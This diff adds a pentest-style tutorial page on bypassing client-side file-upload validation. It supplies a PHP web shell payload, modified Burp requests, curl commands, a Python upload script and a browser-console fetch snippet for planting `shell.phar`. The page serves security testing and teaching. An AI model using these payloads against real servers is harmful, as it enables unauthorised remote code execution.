@@ -1,0 +1,273 @@
+---
+title: Client-side bypass
+description: Defeating browser-side file-upload validation - JavaScript filters, HTML5 `accept` attribute, and intercepting the request directly.
+mitre: [T1190, T1027]
+d3fend: [D3-FA]
+impact: [RCE, ServerSideEval]
+owasp: [A03, A04]
+sidebar:
+  order: 3
+  label: Client-side bypass
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Anything checked in JavaScript runs on your machine. Three ways to bypass:
+
+```
+# 1. Intercept the upload in Burp, modify the request directly
+POST /upload
+filename="shell.png"   →   filename="shell.phar"
+[image bytes]          →   <?php system($_GET["cmd"]); ?>
+
+# 2. Disable the JS validation in the browser
+Right-click input → Inspect → remove onchange="checkFile(this)"
+
+# 3. Use curl, bypassing the browser entirely
+curl -F "file=@shell.phar" https://target/upload
+```
+
+Success indicator: the upload succeeds despite the page rejecting the file in the browser.
+
+## Why client-side validation is broken
+
+The browser is the operator's machine. JavaScript validation logic runs there. Every variable, function, and check is inspectable, modifiable, or skippable. The server should treat any client-side validation as a hint to legitimate users, not a security control.
+
+In practice, applications still deploy client-side-only validation because:
+
+- Developers added the JS for UX (clear error messages, instant feedback) and assumed the server would also validate, but it doesn't
+- The original design had server-side validation that got removed during refactoring
+- The validation was added to a JavaScript framework component, and the equivalent server-side check was never written
+- The team thought file-selector `accept=".jpg,.png"` was security (it's not - it's a UI hint)
+
+## Detection
+
+The fastest tell: try uploading a `.php` (or whatever you want) and watch what happens.
+
+- **The file selector greys it out / doesn't show it** → `<input accept="...">` filter. Trivial.
+- **You can select it, but the upload form rejects it before sending** → JavaScript validation. Trivial.
+- **The upload sends but the server rejects** → server-side validation. Move to the [extension](/codex/web/uploads/extension-blacklist/) or [content](/codex/web/uploads/content-type-bypass/) bypass pages.
+
+To confirm validation is *only* client-side, capture a normal-image upload in Burp, then modify it to a `.php` and replay. If the server accepts the modified upload, client-side was the only barrier.
+
+## Method 1 - Burp request manipulation
+
+The cleanest bypass. Send a legitimate upload first to capture the request shape, then modify it.
+
+### Capture the request
+
+Upload any allowed file (a real image, for example). Burp shows the multipart upload:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+Content-Length: ...
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="real.png"
+Content-Type: image/png
+
+[binary PNG bytes]
+-----X--
+```
+
+### Modify in repeater
+
+Send to Repeater (Ctrl-R). Change two things:
+
+1. **`filename`** - change `real.png` to `shell.phar`
+2. **Body content** - replace the binary PNG bytes with PHP code:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+Content-Length: ...
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
+Content-Type: image/png
+
+<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+Send. Server returns success → server-side validation isn't actually checking anything, just trusting the client.
+
+### Note on Content-Type header
+
+The `Content-Type: image/png` in the form-data block is still there from your original upload. This sometimes matters (when the server actually parses it) and sometimes doesn't. Try both:
+
+1. **Leave it as `image/png`** - looks more like a real upload, might survive a sloppy server check
+2. **Change to `application/x-php`** - declares what the file actually is
+
+Most servers don't validate based on this header alone (it's also client-controlled), but some do as part of layered validation. See [Content-Type bypass](/codex/web/uploads/content-type-bypass/) for the dedicated treatment.
+
+## Method 2 - Disable JS validation in the browser
+
+When you want to test the upload flow through the browser (rather than fighting Burp for every variation), disable the JavaScript validation directly.
+
+### Find the validation function
+
+Open the page Inspector (Ctrl-Shift-C or right-click → Inspect on the file input). The HTML usually looks like:
+
+```html
+<input type="file" name="uploadFile" id="uploadFile" 
+       onchange="checkFile(this)" 
+       accept=".jpg,.jpeg,.png">
+```
+
+Two things to remove:
+
+- `onchange="checkFile(this)"` - runs the validation on file selection
+- `accept=".jpg,.jpeg,.png"` - restricts the file selector dialog
+
+### Remove the attributes
+
+Double-click each attribute in the Inspector, delete its value, press Enter. The input now accepts any file with no validation.
+
+In Firefox the inspector applies changes immediately. In Chrome the same flow works through DevTools → Elements panel.
+
+### Verify the validation function code
+
+Click into the Console (Ctrl-Shift-K in Firefox). Type the function name to see its source:
+
+```javascript
+> checkFile
+function checkFile(File) {
+    let extension = File.value.split('.').pop().toLowerCase();
+    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
+        $('#error_message').text("Only images are allowed!");
+        File.form.reset();
+        $("#submit").attr("disabled", true);
+    }
+}
+```
+
+Reading the function reveals exactly what's being checked - extension only, content type, anything else. After confirming the check is client-side, the same Inspector approach disables it.
+
+### Persistence
+
+These changes don't survive a page refresh - JavaScript reloads on every page load. For repeated testing:
+
+- Either refresh and re-edit (annoying but works)
+- Use Burp Repeater for the actual exploit (preferred for serious testing)
+- Use browser extensions like Tampermonkey to apply a userscript that persistently disables validation
+
+## Method 3 - curl bypass
+
+The cleanest scripting path - never touch the browser at all:
+
+```bash
+curl -F "uploadFile=@shell.phar" \
+     -H "Content-Type: multipart/form-data" \
+     https://target/upload.php
+```
+
+The `-F` flag sends a multipart form upload. The `@shell.phar` syntax tells curl to read from the file. No JavaScript runs.
+
+When the upload requires a session cookie:
+
+```bash
+# Get the cookie first
+curl -c cookies.txt https://target/login -d "user=...&pass=..."
+
+# Then upload with the cookie
+curl -b cookies.txt -F "uploadFile=@shell.phar" https://target/upload.php
+```
+
+When the form has additional fields (CSRF token, etc.):
+
+```bash
+curl -b cookies.txt \
+     -F "csrf_token=abc123" \
+     -F "uploadFile=@shell.phar" \
+     https://target/upload.php
+```
+
+The CSRF token usually needs to be fetched from the page first. A two-step Python script handles this cleanly:
+
+```python
+import requests
+import re
+
+s = requests.Session()
+
+# Get the upload page, extract CSRF
+page = s.get("https://target/upload-form").text
+csrf = re.search(r'name="csrf_token" value="([^"]+)"', page).group(1)
+
+# Upload with the token
+with open("shell.phar", "rb") as f:
+    res = s.post(
+        "https://target/upload.php",
+        data={"csrf_token": csrf},
+        files={"uploadFile": ("shell.phar", f, "image/png")},
+    )
+
+print(res.status_code, res.text)
+```
+
+## Method 4 - Disable JavaScript globally
+
+Nuclear option: turn off JavaScript in the browser entirely.
+
+- **Firefox**: `about:config` → `javascript.enabled` → false
+- **Chrome**: Settings → Privacy → Site settings → JavaScript → Block
+- **Browser extension**: NoScript, ScriptSafe, uMatrix
+
+With JS off, the page's validation can't run. Some forms will break entirely (modern apps depend heavily on JS), so this is a last resort. Generally Method 1 (Burp manipulation) or Method 3 (curl) is cleaner.
+
+## Method 5 - Modify and submit at form level
+
+When the form itself uses JavaScript to construct the upload (modern SPA-style apps), modifying the HTML elements may not be enough - the JS reads the file at upload time and might re-validate.
+
+The workaround: bypass the form, send the upload directly via JS in the browser console:
+
+```javascript
+const formData = new FormData();
+formData.append('uploadFile', new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'image/png'}), 'shell.phar');
+
+fetch('/upload.php', {
+    method: 'POST',
+    body: formData,
+    credentials: 'include',
+}).then(r => r.text()).then(console.log);
+```
+
+Open the page, open the Console, paste, press Enter. The fetch uses the session's cookies (`credentials: 'include'`) and sends the upload bypassing all form-level JS.
+
+## When client-side validation is actually OK
+
+A subtle case worth knowing: when the application has both client-side AND robust server-side validation, the client-side check is fine. Defenders sometimes call this "defense in depth" and treat the client-side check as a UX hint.
+
+In this case, bypassing client-side validation gets you to server-side validation, which catches you. The path forward isn't to argue with the client-side check - it's to attack the server-side validation. Move to [Extension blacklist](/codex/web/uploads/extension-blacklist/), [Extension whitelist](/codex/web/uploads/extension-whitelist/), or [Content-Type bypass](/codex/web/uploads/content-type-bypass/).
+
+## Detection diagnostic
+
+A one-shot check to confirm client-side-only validation:
+
+```bash
+# Capture a normal upload in Burp
+# Modify filename to shell.phar and content to <?php echo "OK"; ?>
+# Send
+
+# If the server response says "success" → client-side only, you have RCE potential
+# If the server response says "extension not allowed" → server-side validation in play
+# If the server response says "image content invalid" → MIME validation in play
+```
+
+The response message often tells you what stopped you - read it carefully before guessing.
+
+## Notes
+
+- **The `accept` attribute is UX-only.** `<input accept=".png">` is a hint to the file picker dialog about which files to highlight. It's not a security control - users can always select "All Files" and pick anything.
+- **Client-side validation is sometimes legitimate.** When backed by proper server-side validation, it's a UX feature. When it's the *only* validation, it's a vulnerability. Test before assuming.
+- **Modern frameworks make this less common, not gone.** Vue, React, and Angular apps tend to delegate validation to the API layer rather than handling it in front-end form components. The bug appears most often in custom-rolled forms in apps that don't use a modern framework.
+- **CSP doesn't help here.** Content Security Policy controls what JS can run, not what JS does once running. Validation logic written by the application is allowed by the application's own CSP.
+
+<Aside type="tip">
+The 30-second client-side bypass check: open Burp, capture a normal upload, change the filename to `shell.phar` and content to `<?php echo "OK"; ?>`, replay. If the upload succeeds, you're past the client-side check - visit the uploaded file URL and look for `OK` in the response to confirm the file executes.
+</Aside>
